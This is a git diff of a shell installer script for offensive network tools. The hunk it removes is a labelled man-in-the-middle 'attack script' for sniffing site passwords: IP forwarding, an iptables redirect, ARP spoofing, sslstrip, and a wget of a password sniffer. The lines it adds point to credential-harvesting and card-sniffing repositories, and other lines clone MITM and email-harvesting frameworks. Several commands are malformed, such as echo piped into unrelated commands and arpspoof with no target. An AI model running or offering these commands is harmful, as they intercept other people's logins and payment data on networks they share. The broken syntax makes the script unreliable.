@@ -165,27 +165,10 @@ git clone https://github.com/DynamicDesignz/Pukeko.git
 #git clone https://github.com/DynamicDesignz/Word-List-Generator.git
 #git clone https://github.com/UndeadSec/GoblinWordGenerator.git
 
-###git clone https://github.com/DynamicDesignz/security-onion.git
 
 
 
 
-#### IMPLEMENT INTO OWN SCRIPT IN MASTER SHELL
-echo "          MITM2SSL ATTACK SCRIPT       "
-echo
-echo "MITM Over SSL - Sniffing Out Passeords Over SSL"
-echo "IPV4Forwars" | echo 1 > /proc/sys/net/ipv4/ip_forward
-echo "Rerouting HTTPS Traffic To SSLsplit" | iptables -t nat -A PREROUTING -p tcp –destination-port 80 -j REDIRECT –to-port 8080
-echo "Locating Network Gateway" | route -n | grep gateway
-echo "Poisioning Wireless Routing And Switching Traffic Destinations" | arpspoof -i -t
-echo "Listening For Decrypted SSL Traffic In Plaintext" | sslstrip -l 8080
-echo "Monitoring SSLdump Log Live For Site Login Passwords" | watch -n 0,2 sslstrip.log
-echo
-echo "EtterSSL: Ettercap & SSLstrip Package" | cd /opt && sudo git clone https://github.com/DynamicDesignz/Ettercap-and-sslstrip.git
-echo
-echo
-echo "TCPdump Password Sniffer" | cd /usr/local/bin && sudo wget https://raw.githubusercontent.com/DynamicDesignz/master_shell/master/tcppasssniff
-echo
 
 
 
@@ -198,6 +181,7 @@ echo
 #echo "Installing XeroSploit MITM Seemless Framework" | sudo git clone https://github.com/LionSec/xerosploit.git
 #echo
 
+https://github.com/DynamicDesignz/injectify.git
 
 echo "IMPLEMENTING XEROSPLOIT" | sudo git clone https://github.com/LionSec/xerosploit
 cd xerosploit && sudo python install.py
@@ -213,6 +197,12 @@ echo "Email Harvesting Tools"
 git clone https://github.com/DynamicDesignz/theHarvester.git
 #jigsaw.rb email harvester
 #emap-harvest script from own repo file
+
+#################################################################################################################
+
+https://github.com/DynamicDesignz/net-creds.git
+https://github.com/DynamicDesignz/PCredz.git
+https://github.com/DynamicDesignz/CardPwn.git
 
 echo "Black Arch Repository For Network Sniffers"
 firefox https://blackarch.org/sniffer.html
